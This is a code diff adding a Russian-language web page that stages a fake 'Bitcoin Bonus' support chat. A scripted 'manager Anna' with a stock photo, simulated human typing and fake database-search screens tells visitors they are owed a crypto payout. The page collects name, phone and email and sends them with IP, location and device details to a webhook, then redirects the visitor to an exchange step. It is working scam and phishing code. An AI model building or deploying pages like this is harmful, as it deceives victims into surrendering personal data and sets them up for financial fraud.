@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<title>Чат с менеджером | Bitcoin Bonus</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/styles.css">
+</head>
+<body>
+
+<div class="bg-decor"></div>
+<div class="grid-overlay"></div>
+
+<div class="chat-page">
+    <div class="chat-card">
+        <div class="chat-header">
+            <div class="manager-avatar-wrap">
+                <img class="manager-avatar" id="managerAvatar"
+                     src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=200&h=200&fit=crop&crop=faces&q=80"
+                     alt="Анна"
+                     onerror="this.onerror=null;this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 200%22><defs><linearGradient id=%22g%22 x1=%220%22 y1=%220%22 x2=%221%22 y2=%221%22><stop offset=%220%22 stop-color=%22%23f7931a%22/><stop offset=%221%22 stop-color=%22%2322d3ee%22/></linearGradient></defs><rect width=%22200%22 height=%22200%22 fill=%22url(%23g)%22/><text x=%22100%22 y=%22125%22 font-family=%22Arial%22 font-size=%2280%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22>А</text></svg>';">
+                <div class="manager-online-dot"></div>
+            </div>
+            <div class="manager-info">
+                <div class="manager-name">Анна<span class="manager-verified">✓</span></div>
+                <div class="manager-role">Ведущий менеджер отдела выплат • Онлайн</div>
+            </div>
+            <div class="chat-header-actions">
+                <button class="chat-header-btn" title="Информация" onclick="alert('Служба поддержки Bitcoin Bonus\nID чата: BB-' + Date.now().toString().slice(-6))">ⓘ</button>
+            </div>
+        </div>
+
+        <div class="chat-subheader">
+            <span class="lock-icon">🔒</span>
+            <span class="label-enc">Зашифрованное соединение</span>
+            <span>•</span>
+            <span>Bitcoin Bonus Support</span>
+        </div>
+
+        <div class="chat-messages" id="chatMessages"></div>
+
+        <div class="chat-bottom">
+            <div class="chat-input-disabled">
+                <span>Сообщение...</span>
+                <span class="send-icon">➤</span>
+            </div>
+        </div>
+
+        <div class="chat-block-overlay" id="chatBlockOverlay">
+            <div class="spinner-big"></div>
+            <div class="block-title" id="blockTitle">Ожидайте</div>
+            <div class="block-sub" id="blockSub">Пожалуйста, не закрывайте страницу</div>
+            <div class="block-bar-bg"><div class="block-bar-fill" id="blockBarFill"></div></div>
+        </div>
+    </div>
+</div>
+
+<div class="page-loader" id="pageLoader">
+    <div class="spinner-big"></div>
+    <div class="loader-text" id="loaderText">Отправка анкеты менеджеру..</div>
+    <div class="loader-bar-bg"><div class="loader-bar-fill" id="loaderBarFill"></div></div>
+    <div class="loader-timer" id="loaderTimer">До завершения осталось примерно: <strong>6 сек</strong></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
+<script src="assets/state.js"></script>
+<script src="assets/chain.js"></script>
+<script src="assets/rates.js"></script>
+<script src="assets/common.js"></script>
+
+<script>
+
+const CHAT_KEY = 'bitcloud_chat_v1';
+
+const PING_THRESHOLD_MS = 2 * 60 * 1000;
+const PING_1_DELAY_MS   = 60 * 1000;
+const PING_2_DELAY_MS   = 2 * 60 * 1000;
+const STALE_THRESHOLD_MS = 6 * 60 * 60 * 1000;
+
+let chatMessagesEl = null;
+let chatState = {
+    step: 0,
+    messages: [],
+    lastSaveTime: 0,
+    lastActiveTime: 0,
+    startedAt: 0,
+    currentTyping: null,
+    restoring: false,
+    finished: false
+};
+
+function saveChatState() {
+    chatState.lastSaveTime = Date.now();
+    try { localStorage.setItem(CHAT_KEY, JSON.stringify(chatState)); } catch (e) {}
+}
+
+function loadChatState() {
+    try {
+        const s = localStorage.getItem(CHAT_KEY);
+        if (!s) return { hasState: false, reason: 'empty' };
+        const d = JSON.parse(s);
+
+        if (typeof d.startedAt !== 'number' || d.startedAt === 0) {
+            console.log('[Chat] Старый формат стейта → сброс');
+            return { hasState: false, reason: 'old-format' };
+        }
+
+        const age = Date.now() - (d.lastSaveTime || 0);
+        if (age > STALE_THRESHOLD_MS) {
+            console.log('[Chat] Стейт устарел → сброс');
+            return { hasState: false, reason: 'stale' };
+        }
+
+        if (typeof d.step === 'number') chatState.step = d.step;
+        if (Array.isArray(d.messages)) chatState.messages = d.messages;
+        if (typeof d.lastSaveTime === 'number') chatState.lastSaveTime = d.lastSaveTime;
+        if (typeof d.lastActiveTime === 'number') chatState.lastActiveTime = d.lastActiveTime;
+        if (typeof d.startedAt === 'number') chatState.startedAt = d.startedAt;
+        if (typeof d.finished === 'boolean') chatState.finished = d.finished;
+        if (d.currentTyping && typeof d.currentTyping === 'object') {
+            chatState.currentTyping = d.currentTyping;
+        }
+
+        console.log('[Chat] Восстановлено: step=' + chatState.step +
+                    ' msgs=' + chatState.messages.length +
+                    ' typing=' + (chatState.currentTyping ? 'yes' : 'no'));
+        return { hasState: true, reason: 'restored' };
+    } catch (e) {
+        console.warn('[Chat] Ошибка загрузки стейта:', e);
+        return { hasState: false, reason: 'error' };
+    }
+}
+
+function clearChatState() {
+    try { localStorage.removeItem(CHAT_KEY); } catch (e) {}
+}
+
+function resetChatToFresh() {
+    clearChatState();
+    chatState = {
+        step: 0,
+        messages: [],
+        lastSaveTime: Date.now(),
+        lastActiveTime: Date.now(),
+        startedAt: Date.now(),
+        currentTyping: null,
+        restoring: false,
+        finished: false
+    };
+    saveChatState();
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function rand(min, max) { return min + Math.random() * (max - min); }
+function nowTime() {
+    const d = new Date();
+    return String(d.getHours()).padStart(2, '0') + ':' + String(d.getMinutes()).padStart(2, '0');
+}
+function timeFromTimestamp(ts) {
+    const d = new Date(ts);
+    return String(d.getHours()).padStart(2, '0') + ':' + String(d.getMinutes()).padStart(2, '0');
+}
+function chatScrollBottom(smooth = true) {
+    if (chatMessagesEl) {
+        setTimeout(() => {
+            chatMessagesEl.scrollTo({ top: chatMessagesEl.scrollHeight, behavior: smooth ? 'smooth' : 'auto' });
+        }, 60);
+    }
+}
+
+function getCharDelay(ch, ctx) {
+    if (ch === '.' || ch === '!' || ch === '?') return rand(350, 620);
+    if (ch === ',' || ch === ';' || ch === ':') return rand(200, 380);
+    if (ch === '—' || ch === '–') return rand(220, 400);
+    if (ch === ' ' || ch === '\n') return rand(45, 110);
+
+    const isUpper = (ch >= 'А' && ch <= 'Я') || (ch >= 'A' && ch <= 'Z');
+    if (isUpper) return rand(75, 145);
+
+    if (/[0-9@#$%^&*()_+={}[\]|\\/<>~`]/.test(ch)) return rand(80, 160);
+
+    let base = rand(60, 115);
+    if (ctx && ctx.len > 120) {
+        const progress = ctx.i / ctx.len;
+        base *= 1 + progress * 0.25;
+    }
+    if (Math.random() < 0.08) base += rand(80, 200);
+    return base;
+}
+
+function typeHtmlContent(container, html) {
+    return new Promise(resolve => {
+        const tokens = [];
+        let i = 0;
+        while (i < html.length) {
+            if (html[i] === '<') {
+                const end = html.indexOf('>', i);
+                if (end !== -1) {
+                    tokens.push({ t: html.slice(i, end + 1), instant: true });
+                    i = end + 1;
+                    continue;
+                }
+            }
+            const ch = html[i];
+            tokens.push({ t: ch, isChar: true });
+            i++;
+        }
+
+        const charTokens = tokens.filter(t => t.isChar);
+        const totalChars = charTokens.length;
+        let printedChars = 0;
+
+        let result = '';
+        let ti = 0;
+
+        function next() {
+            if (ti >= tokens.length) { resolve(); return; }
+            const tok = tokens[ti];
+            result += tok.t;
+            ti++;
+
+            if (tok.instant) { next(); return; }
+
+            container.innerHTML = result;
+            chatScrollBottom();
+            printedChars++;
+
+            const delay = getCharDelay(tok.t, { len: totalChars, i: printedChars });
+            setTimeout(next, delay);
+        }
+
+        setTimeout(next, rand(150, 400));
+    });
+}
+
+function renderSystemMessage(text) {
+    const el = document.createElement('div');
+    el.className = 'msg-row system';
+    el.innerHTML = `<div class="msg-bubble">${text}</div>`;
+    chatMessagesEl.appendChild(el);
+}
+function renderManagerMessage(text, time) {
+    const row = document.createElement('div');
+    row.className = 'msg-row manager';
+    row.innerHTML = `
+        <img class="msg-avatar" src="${MANAGER_PHOTO}" alt="Анна" onerror="this.style.display='none'">
+        <div class="msg-bubble">${text}<span class="msg-time">${time || nowTime()}</span></div>
+    `;
+    chatMessagesEl.appendChild(row);
+    chatScrollBottom();
+}
+function renderUserMessage(text, time) {
+    const row = document.createElement('div');
+    row.className = 'msg-row user';
+    row.innerHTML = `<div class="msg-bubble">${text}<span class="msg-time">${time || nowTime()}</span></div>`;
+    chatMessagesEl.appendChild(row);
+    chatScrollBottom();
+}
+function renderFormFromState(entry) {
+    const wrap = document.createElement('div');
+    wrap.className = 'chat-form';
+    const disabled = entry.submitted ? 'disabled' : '';
+    const data = entry.data || {};
+    wrap.innerHTML = `
+        <div class="chat-form-title">📝 Анкета получателя выплаты</div>
+        <label>Ваше ФИО</label>
+        <input type="text" id="cfName" placeholder="Введите Ваше ФИО" value="${entry.submitted ? (data.name||'') : ''}" ${disabled}>
+        <label>Номер телефона</label>
+        <input type="tel" id="cfPhone" placeholder="Введите Ваш номер телефона" value="${entry.submitted ? (data.phone||'') : ''}" ${disabled}>
+        <label>Email</label>
+        <input type="email" id="cfEmail" placeholder="Введите Ваш email" value="${entry.submitted ? (data.email||'') : ''}" ${disabled}>
+        ${entry.submitted
+            ? `<div class="form-submitted-badge">✓ Анкета отправлена менеджеру</div>`
+            : `<div class="form-actions"><button class="btn btn-primary" id="cfSubmit">Отправить Анкету Менеджеру</button></div>`}
+    `;
+    chatMessagesEl.appendChild(wrap);
+    chatScrollBottom();
+    return wrap;
+}
+
+async function typeManagerMessage(text, instant) {
+    const typing = document.createElement('div');
+    typing.className = 'typing-bubble';
+    typing.innerHTML = '<div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div>';
+    chatMessagesEl.appendChild(typing);
+    chatScrollBottom();
+
+    if (instant) {
+        await sleep(150);
+    } else {
+        const thinkTime = 700 + Math.random() * 800;
+        await sleep(thinkTime);
+    }
+    typing.remove();
+
+    const row = document.createElement('div');
+    row.className = 'msg-row manager';
+    row.innerHTML = `
+        <img class="msg-avatar" src="${MANAGER_PHOTO}" alt="Анна" onerror="this.style.display='none'">
+        <div class="msg-bubble"><span class="typed-content"></span><span class="msg-time" style="display:none">${nowTime()}</span></div>
+    `;
+    chatMessagesEl.appendChild(row);
+    const content = row.querySelector('.typed-content');
+    const timeEl = row.querySelector('.msg-time');
+
+    if (!instant) {
+        chatState.currentTyping = {
+            text: text,
+            startedAt: Date.now()
+        };
+        saveChatState();
+    }
+
+    await typeHtmlContent(content, text);
+    timeEl.style.display = '';
+    chatScrollBottom();
+
+    chatState.currentTyping = null;
+    saveChatState();
+}
+
+function showOptions(options) {
+    return new Promise(resolve => {
+        const wrap = document.createElement('div');
+        wrap.className = 'chat-options';
+        options.forEach(opt => {
+            const btn = document.createElement('button');
+            btn.className = 'chat-option-btn';
+            btn.textContent = opt.label;
+            btn.onclick = () => {
+                wrap.querySelectorAll('.chat-option-btn').forEach(b => { b.disabled = true; b.style.opacity = '0.5'; });
+                btn.style.opacity = '1';
+                renderUserMessage(opt.label);
+                chatState.messages.push({ type: 'user', text: opt.label, time: nowTime() });
+                saveChatState();
+                wrap.style.transition = 'opacity 0.3s';
+                wrap.style.opacity = '0';
+                setTimeout(() => { wrap.remove(); resolve(opt.value); }, 300);
+            };
+            wrap.appendChild(btn);
+        });
+        chatMessagesEl.appendChild(wrap);
+        chatScrollBottom();
+    });
+}
+
+function addLoaderBlock(title, seconds, subText) {
+    return new Promise(resolve => {
+        const wrap = document.createElement('div');
+        wrap.className = 'chat-loader';
+        wrap.innerHTML = `
+            <div class="loader-title"><div class="loader-spinner"></div>${title}</div>
+            ${subText ? `<div style="font-size:11.5px;color:var(--text-muted);margin-bottom:10px;">${subText}</div>` : ''}
+            <div class="loader-bar-bg"><div class="loader-bar-fill"></div></div>
+            <div class="loader-timer">До завершения осталось примерно: <strong>${seconds} сек</strong></div>
+        `;
+        chatMessagesEl.appendChild(wrap);
+        chatScrollBottom();
+        const bar = wrap.querySelector('.loader-bar-fill');
+        const timer = wrap.querySelector('.loader-timer strong');
+        const startTime = Date.now();
+        const totalMs = seconds * 1000;
+        const interval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const p = Math.min(elapsed / totalMs, 1);
+            if (bar) bar.style.width = (p * 100).toFixed(1) + '%';
+            const left = Math.max(0, Math.ceil(seconds - elapsed / 1000));
+            if (timer) timer.textContent = left + ' сек';
+            if (p >= 1) {
+                clearInterval(interval);
+                wrap.style.transition = 'opacity 0.3s';
+                wrap.style.opacity = '0';
+                setTimeout(() => { wrap.remove(); resolve(); }, 300);
+            }
+        }, 100);
+    });
+}
+
+function blockScreen(title, sub, seconds) {
+    return new Promise(resolve => {
+        const overlay = document.getElementById('chatBlockOverlay');
+        const bt = document.getElementById('blockTitle');
+        const bs = document.getElementById('blockSub');
+        const bf = document.getElementById('blockBarFill');
+        bt.textContent = title;
+        bs.textContent = sub || '';
+        bf.style.width = '0%';
+        overlay.classList.add('active');
+        const start = Date.now();
+        const totalMs = seconds * 1000;
+        const iv = setInterval(() => {
+            const elapsed = Date.now() - start;
+            const p = Math.min(elapsed / totalMs, 1);
+            bf.style.width = (p * 100).toFixed(1) + '%';
+            if (p >= 1) { clearInterval(iv); overlay.classList.remove('active'); resolve(); }
+        }, 100);
+    });
+}
+
+function handleFormSubmit(entry, wrap, resolve) {
+    const name = document.getElementById('cfName').value.trim();
+    const phone = document.getElementById('cfPhone').value.trim();
+    const email = document.getElementById('cfEmail').value.trim();
+
+    let ok = true;
+    [['cfName', name.length >= 3],
+     ['cfPhone', phone.length >= 6],
+     ['cfEmail', /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)]].forEach(([id, valid]) => {
+        const inp = document.getElementById(id);
+        if (!valid) { inp.classList.add('invalid'); ok = false; }
+        else inp.classList.remove('invalid');
+    });
+    if (!ok) return;
+
+    sendWebhook({
+        userId: window.appState.userId,
+        name, phone, email,
+        btc: FINAL_BTC_BALANCE.toFixed(8),
+        usd: (FINAL_BTC_BALANCE * window.btcPrice).toFixed(2),
+        rub: (FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub).toFixed(2),
+        btcPrice: window.btcPrice.toFixed(2),
+        usdToRub: window.usdToRub.toFixed(2),
+        btcSource: window.btcSource, rubSource: window.rubSource,
+        ip: window.appState.geo ? window.appState.geo.ip : '',
+        city: window.appState.geo ? window.appState.geo.city : '',
+        country: window.appState.geo ? window.appState.geo.country : '',
+        device: window.appState.device || null,
+        timestamp: new Date().toISOString(),
+        page: 'chat'
+    });
+
+    entry.submitted = true;
+    entry.data = { name, phone, email };
+    saveChatState();
+
+    wrap.querySelectorAll('input').forEach(i => i.disabled = true);
+    const actions = wrap.querySelector('.form-actions');
+    if (actions) {
+        actions.style.transition = 'opacity 0.3s';
+        actions.style.opacity = '0';
+        setTimeout(() => {
+            actions.outerHTML = `<div class="form-submitted-badge">✓ Анкета отправлена менеджеру</div>`;
+        }, 300);
+    }
+    resolve({ name, phone, email });
+}
+
+function waitForForm(entry) {
+    return new Promise(resolve => {
+        const wrap = renderFormFromState(entry);
+        document.getElementById('cfSubmit').onclick = () => {
+            handleFormSubmit(entry, wrap, resolve);
+        };
+    });
+}
+
+function waitForExchangeButton(entry) {
+    return new Promise(resolve => {
+        const wrap = document.createElement('div');
+        wrap.className = 'chat-options';
+        wrap.style.marginTop = '6px';
+        const btn = document.createElement('button');
+        btn.className = 'chat-option-btn';
+        btn.style.background = 'linear-gradient(135deg, var(--primary), var(--primary-light))';
+        btn.style.color = '#0a0e1a';
+        btn.style.borderColor = 'transparent';
+        btn.style.fontWeight = '700';
+        btn.style.justifyContent = 'center';
+        btn.innerHTML = '<span>Обменять BTC → RUB</span>';
+        if (entry.clicked) { btn.disabled = true; btn.style.opacity = '0.6'; }
+        btn.onclick = () => {
+            if (entry.clicked) return;
+            entry.clicked = true;
+            saveChatState();
+            btn.disabled = true;
+            btn.style.opacity = '0.6';
+            wrap.style.transition = 'opacity 0.3s';
+            wrap.style.opacity = '0';
+            setTimeout(() => { wrap.remove(); resolve(); }, 300);
+        };
+        wrap.appendChild(btn);
+        chatMessagesEl.appendChild(wrap);
+        chatScrollBottom();
+    });
+}
+
+function buildChatScript() {
+    const btcAmount = FINAL_BTC_BALANCE;
+    const usdAmount = btcAmount * window.btcPrice;
+    const rubAmount = usdAmount * window.usdToRub;
+
+    return [
+        { type: 'system', text: 'Не закрывайте страницу!<br>Связываемся с менеджером Анной для оформления вывода...' },
+        { type: 'loader', text: 'Устанавливаем соединение...', seconds: 4, sub: 'Связываемся с менеджером Анной' },
+        { type: 'manager', text: 'Добрый вечер! Меня зовут <strong>Анна</strong>, я&nbsp;— ведущий менеджер отдела выплат сервиса «Bitcoin Bonus».' },
+        { type: 'manager', text: 'Судя по информации, которой я располагаю, Вы не появлялись на сайте в течение <strong>364 дней</strong>. В связи с этим вопрос: Вы ранее получали уведомление о том, что Вам полагается выплата от <strong>Bitcoin Bonus</strong>?' },
+        { type: 'manager', text: 'Жду от Вас ответа 👇' },
+        { type: 'options', options: [
+            { label: 'Да, получал(а)', value: 'yes' },
+            { label: 'Не помню', value: 'no-memory' },
+            { label: 'Не заметил(а)', value: 'missed' }
+        ]},
+        { type: 'manager', text: 'У меня есть одобренная активная заявка с Вашего аккаунта на вывод заработанных Вами биткоин-бонусов.' },
+        { type: 'manager', text: 'Для того, чтобы осуществить перевод средств с сервиса на Вашу карту или кошелёк, необходимо наличие Вашей анкеты. Я сейчас поищу эту анкету, это займёт не более минуты.' },
+        { type: 'block', title: 'Ожидайте', sub: 'Поиск вашей анкеты в базе данных', seconds: 6 },
+        { type: 'manager', text: 'Благодарю за ожидание. Я проверила, и не нашла Вашу анкету в нашей базе. Это значит, что Вы ещё не выводили накопленные биткоины с сервиса.' },
+        { type: 'manager', text: 'Я уже начала оформление Вам выплаты, но мне требуется от Вас анкета с контактными данными для связи.' },
+        { type: 'manager', text: `Пожалуйста, заполните её прямо сейчас, чтобы как можно быстрее обменять биткоины в Вашу валюту <strong>RUB</strong>. Система сообщает, что к выплате Вам полагается: <span class="money-inline">${formatUsd(usdAmount)}</span> <span class="money-inline-rub">(${formatRub(rubAmount)})</span>` },
+        { type: 'manager', text: 'После того как Вы заполните анкету, я с Вами свяжусь и помогу заказать выплату в течение <strong>24 часов</strong>.<br><br>Заполните анкету по кнопке ниже 👇' },
+        { type: 'loader', text: 'Загрузка формы...', seconds: 2, sub: 'Пожалуйста, подождите' },
+        { type: 'form' },
+        { type: 'pageLoader', text: 'Отправка анкеты менеджеру..', seconds: 6 },
+        { type: 'manager', text: 'Я получила от Вас анкету.' },
+        { type: 'manager', text: 'Чтобы завершить оформление выплаты, мы с Вами сейчас должны обменять Ваши биткоины в Вашу валюту <strong>RUB</strong>.' },
+        { type: 'manager', text: 'Курс обмена лучший — по специальному сервису <strong>Binance</strong>.' },
+        { type: 'manager', text: `После конвертации валюты Вы получите: <span class="money-inline-rub">${formatRub(rubAmount)}</span>` },
+        { type: 'exchangeButton' },
+        { type: 'pageLoader', text: 'Идёт перевод выплаты на биржу обмена криптовалюты.', seconds: 5, subPrefix: 'До завершения осталось примерно: ' },
+        { type: 'redirect', url: 'changebtc.html' }
+    ];
+}
+
+async function runChat() {
+    const SCRIPT = buildChatScript();
+    console.log('[Chat] Старт. Шаг:', chatState.step, 'Всего шагов:', SCRIPT.length);
+
+    while (chatState.step < SCRIPT.length) {
+        const step = SCRIPT[chatState.step];
+        const instant = chatState.restoring === true;
+
+        const skipped = await executeStep(step, instant);
+
+        chatState.step++;
+        if (!skipped) chatState.restoring = false;
+        saveChatState();
+    }
+
+    chatState.finished = true;
+    saveChatState();
+    console.log('[Chat] Сценарий завершён');
+}
+
+async function executeStep(step, instant) {
+    switch (step.type) {
+        case 'system':
+            renderSystemMessage(step.text);
+            chatState.messages.push({ type: 'system', text: step.text });
+            saveChatState();
+            break;
+
+        case 'manager':
+            if (instant) {
+                renderManagerMessage(step.text, nowTime());
+            } else {
+                await typeManagerMessage(step.text, false);
+            }
+            chatState.messages.push({ type: 'manager', text: step.text, time: nowTime() });
+            saveChatState();
+            break;
+
+        case 'loader':
+            if (instant) return 'skipped';
+            await addLoaderBlock(step.text, step.seconds, step.sub);
+            break;
+
+        case 'block':
+            if (instant) return 'skipped';
+            await blockScreen(step.title, step.sub, step.seconds);
+            break;
+
+        case 'options':
+            saveChatState();
+            await showOptions(step.options);
+            break;
+
+        case 'form': {
+            const lastMsg = chatState.messages[chatState.messages.length - 1];
+            let entry;
+            if (lastMsg && lastMsg.type === 'form' && !lastMsg.submitted) {
+                entry = lastMsg;
+                const btn = document.getElementById('cfSubmit');
+                if (btn) {
+                    const wrap = btn.closest('.chat-form');
+                    if (wrap) {
+                        await new Promise(resolve => {
+                            btn.onclick = () => handleFormSubmit(entry, wrap, resolve);
+                        });
+                        break;
+                    }
+                }
+                entry = { type: 'form', submitted: false, data: null };
+                chatState.messages.push(entry);
+                saveChatState();
+            } else {
+                entry = { type: 'form', submitted: false, data: null };
+                chatState.messages.push(entry);
+                saveChatState();
+            }
+            await waitForForm(entry);
+            break;
+        }
+
+        case 'exchangeButton': {
+            const lastMsg = chatState.messages[chatState.messages.length - 1];
+            let entry;
+            if (lastMsg && lastMsg.type === 'exchange' && !lastMsg.clicked) {
+                entry = lastMsg;
+                const btns = document.querySelectorAll('.chat-option-btn');
+                const exchangeBtn = Array.from(btns).find(b => b.textContent.includes('Обменять BTC'));
+                if (exchangeBtn) {
+                    const wrap = exchangeBtn.closest('.chat-options');
+                    if (wrap) {
+                        await new Promise(resolve => {
+                            exchangeBtn.onclick = () => {
+                                if (entry.clicked) return;
+                                entry.clicked = true;
+                                saveChatState();
+                                exchangeBtn.disabled = true;
+                                exchangeBtn.style.opacity = '0.6';
+                                wrap.style.transition = 'opacity 0.3s';
+                                wrap.style.opacity = '0';
+                                setTimeout(() => { wrap.remove(); resolve(); }, 300);
+                            };
+                        });
+                        break;
+                    }
+                }
+                await waitForExchangeButton(entry);
+                break;
+            }
+            entry = { type: 'exchange', clicked: false };
+            chatState.messages.push(entry);
+            saveChatState();
+            await waitForExchangeButton(entry);
+            break;
+        }
+
+        case 'pageLoader':
+            if (instant) return 'skipped';
+            await showPageLoader(step.text, step.seconds, step.subPrefix);
+            break;
+
+        case 'redirect':
+            window.appState.chatCompleted = true;
+            saveState();
+            window.location.href = step.url;
+            return 'skipped';
+
+        default:
+            console.warn('Unknown step:', step.type);
+    }
+}
+
+function renderStateMessages() {
+    chatMessagesEl.innerHTML = '';
+    const sep = document.createElement('div');
+    sep.className = 'chat-date-separator';
+    sep.innerHTML = `<span>Сегодня</span>`;
+    chatMessagesEl.appendChild(sep);
+
+    chatState.messages.forEach((m, idx) => {
+        const isLast = (idx === chatState.messages.length - 1);
+
+        if (m.type === 'system') {
+            renderSystemMessage(m.text);
+        } else if (m.type === 'manager') {
+            renderManagerMessage(m.text, m.time);
+        } else if (m.type === 'user') {
+            renderUserMessage(m.text, m.time);
+        } else if (m.type === 'form') {
+            if (isLast && !m.submitted) {
+                // пропускаем — отрисуется через executeStep
+            } else {
+                renderFormFromState(m);
+            }
+        } else if (m.type === 'exchange') {
+            if (isLast && !m.clicked) {
+                // пропускаем — отрисуется через executeStep
+            } else {
+                waitForExchangeButton(m);
+            }
+        }
+    });
+    chatScrollBottom(false);
+}
+
+async function completeTypingAndPings() {
+    if (chatState.currentTyping && chatState.currentTyping.text) {
+        const ct = chatState.currentTyping;
+        console.log('[Chat] Обнаружено прерванное сообщение → завершаем');
+
+        const timeStr = timeFromTimestamp(ct.startedAt || Date.now());
+        chatState.messages.push({
+            type: 'manager',
+            text: ct.text,
+            time: timeStr
+        });
+        chatState.step++;
+        chatState.currentTyping = null;
+        saveChatState();
+    }
+
+    if (chatState.step === 0) return;
+    if (chatState.finished) return;
+
+    const lastActive = chatState.lastActiveTime || chatState.lastSaveTime || 0;
+    const awayMs = Date.now() - lastActive;
+
+    if (awayMs < PING_THRESHOLD_MS) return;
+
+    console.log('[Chat] Юзер отсутствовал ' + Math.round(awayMs / 60000) + ' мин → пинги');
+
+    const ping1Time = timeFromTimestamp(lastActive + PING_1_DELAY_MS);
+    const ping2Time = timeFromTimestamp(lastActive + PING_2_DELAY_MS);
+
+    const pings = [
+        { text: 'Вы где?', time: ping1Time },
+        { text: 'Вы на связи?', time: ping2Time }
+    ];
+
+    for (const p of pings) {
+        renderManagerMessage(p.text, p.time);
+        chatState.messages.push({ type: 'manager', text: p.text, time: p.time });
+        await sleep(500);
+    }
+    saveChatState();
+}
+
+window.addEventListener('beforeunload', () => {
+    chatState.lastActiveTime = Date.now();
+    try { localStorage.setItem(CHAT_KEY, JSON.stringify(chatState)); } catch (e) {}
+});
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+        chatState.lastActiveTime = Date.now();
+        try { localStorage.setItem(CHAT_KEY, JSON.stringify(chatState)); } catch (e) {}
+    }
+});
+
+document.addEventListener('DOMContentLoaded', async () => {
+    try { loadState(); } catch (e) { console.warn('[Chat] loadState error:', e); }
+
+    if (typeof initRates === 'function') {
+        initRates().catch(e => console.warn('[Chat] initRates error:', e));
+    }
+    if (typeof ensureGeo === 'function') {
+        ensureGeo().catch(e => console.warn('[Chat] ensureGeo error:', e));
+    }
+    if (typeof ensureDevice === 'function') {
+        ensureDevice();
+    }
+
+    chatMessagesEl = document.getElementById('chatMessages');
+    if (!chatMessagesEl) {
+        console.error('[Chat] #chatMessages не найден');
+        return;
+    }
+    chatMessagesEl.innerHTML = '';
+
+    if (location.search.includes('reset=1')) {
+        console.log('[Chat] Принудительный сброс через URL');
+        clearChatState();
+    }
+
+    const loadResult = loadChatState();
+    console.log('[Chat] Загрузка стейта:', loadResult);
+
+    if (chatState.finished) {
+        window.appState.chatCompleted = true;
+        saveState();
+        console.log('[Chat] Чат завершён → редирект на changebtc.html');
+        window.location.href = 'changebtc.html';
+        return;
+    }
+
+    if (loadResult.hasState && chatState.messages.length > 0) {
+        console.log('[Chat] Возврат в чат');
+        chatState.restoring = true;
+        renderStateMessages();
+        await completeTypingAndPings();
+    } else {
+        console.log('[Chat] Новый чат');
+        resetChatToFresh();
+        await sleep(400);
+    }
+
+    runChat();
+});
+</script>
+</body>
+</html>
